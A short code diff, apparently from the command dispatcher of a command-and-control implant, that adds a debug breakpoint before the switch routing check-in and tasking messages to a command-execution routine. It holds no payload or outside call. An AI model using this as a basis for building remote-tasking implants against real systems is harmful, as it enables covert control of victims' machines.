@@ -215,6 +215,7 @@ namespace Dispatcher {
 
         Ctx->session.current_taskid = Parser::UnpackDword(&parser);
 
+        __debugbreak();
         switch (Parser::UnpackDword(&parser)) {
             case TypeCheckin:   Ctx->session.checkin = true;
             case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
